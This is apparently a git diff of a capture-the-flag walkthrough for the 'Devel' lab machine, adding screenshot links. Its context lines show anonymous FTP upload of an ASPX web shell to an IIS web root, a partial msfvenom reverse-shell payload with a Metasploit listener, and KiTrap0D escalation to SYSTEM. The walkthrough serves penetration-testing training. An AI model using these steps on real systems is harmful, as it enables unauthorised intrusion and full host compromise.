@@ -22,6 +22,8 @@ A service scan reveals only two accessible services.
 nmap -sC -sV -oN nmap_scan 10.129.242.143
 ```
 
+![Nmap Scan](images/nmap_scan.png)
+	
 ### Result
 
 ```
@@ -52,6 +54,8 @@ Connect to the FTP service.
 ftp 10.129.242.143
 ```
 
+![FTP Login](images/ftp_logged-in.png)
+
 Login anonymously.
 
 ```
@@ -66,6 +70,8 @@ List the contents.
 ```text
 ftp> ls
 ```
+
+![FTP Files](images/ftp_listing.png)
 
 Output:
 
@@ -87,6 +93,8 @@ Browse to the web server.
 http://10.129.242.143
 ```
 
+![IIS Homepage](images/IIS7.png)
+
 The default IIS7 landing page is displayed.
 
 Since IIS is serving the same files observed through FTP, anything uploaded through FTP should become directly accessible via HTTP.
@@ -106,6 +114,8 @@ Location:
 ```bash
 cd /usr/share/webshells/aspx
 ```
+
+![Copy Webshell](images/webshells.png)
 
 Files available include:
 
@@ -135,6 +145,8 @@ Upload the shell.
 put cmdasp.aspx
 ```
 
+![FTP Upload](images/ftp_webshell-upload.png)
+
 Verify the upload.
 
 ```
@@ -145,6 +157,8 @@ cmdasp.aspx
 iisstart.htm
 welcome.png
 ```
+
+![FTP Listing](images/ftp_listing_after_upload.png)
 
 The upload completes successfully.
 
@@ -157,6 +171,7 @@ Open the uploaded shell.
 ```
 http://10.129.242.143/cmdasp.aspx
 ```
+![Webshell](images/access-denied_webshell.png)
 
 The page provides a simple interface capable of executing arbitrary Windows commands.
 
@@ -165,6 +180,8 @@ Example:
 ```
 dir
 ```
+
+![Command Output](images/dir_cmd.png)
 
 The response displays the contents of:
 
@@ -216,6 +233,8 @@ LPORT=8888 \
 > devel.aspx
 ```
 
+![MSFVenom](images/msf-payload_exec.png)
+
 Configure a Metasploit listener.
 
 ```text
@@ -227,12 +246,15 @@ set LPORT 8888
 
 run
 ```
+![Handler](images/msf-options.png)
 
 Upload the generated payload through FTP.
 
 ```text
 put devel.aspx
 ```
+
+![FTP Upload Payload](images/ftp-put-revshell.png)
 
 The upload succeeds successfully.
 
@@ -310,6 +332,8 @@ set SESSION 2
 run
 ```
 
+![Local Exploit Suggester](images/13_local_exploit_suggester.png)
+
 The module reports several potential exploits, including:
 
 ```
@@ -353,6 +377,8 @@ Run the exploit.
 run
 ```
 
+![Exploit Configuration](images/14_kitrap0d_options.png)
+
 After successful execution, Metasploit establishes a new privileged Meterpreter session.
 
 ```
@@ -371,6 +397,8 @@ Output:
 NT AUTHORITY\SYSTEM
 ```
 
+![SYSTEM Meterpreter](images/15_system_meterpreter.png)
+
 The privilege escalation is now complete.
 
 ---
@@ -378,6 +406,8 @@ The privilege escalation is now complete.
 # Capturing the User Flag
 
 Navigate to the standard user profile.
+
+![User Directory](images/16_user_directory.png)
 
 ```cmd
 cd C:\Users\babis\Desktop
@@ -404,6 +434,8 @@ The user flag is successfully captured.
 # Capturing the Root Flag
 
 Navigate to the Administrator desktop.
+
+![Root Flag](images/17_root_flag.png)
 
 ```cmd
 cd C:\Users\Administrator\Desktop
@@ -469,3 +501,4 @@ The root flag is successfully obtained.
 Devel is an excellent introductory Windows machine that demonstrates how multiple low-severity misconfigurations can combine into complete system compromise. Anonymous FTP access exposed a writable IIS web root, enabling the upload of an ASPX web shell and remote command execution. This foothold was upgraded to a Meterpreter session, after which local enumeration identified the **MS10-015 (KiTrap0D)** vulnerability. Exploiting this flaw resulted in **NT AUTHORITY\SYSTEM** privileges and full control of the host.
 
 The machine reinforces several key penetration testing concepts, including service enumeration, web shell deployment, Windows post-exploitation, and local privilege escalation through vulnerable kernel components.
+
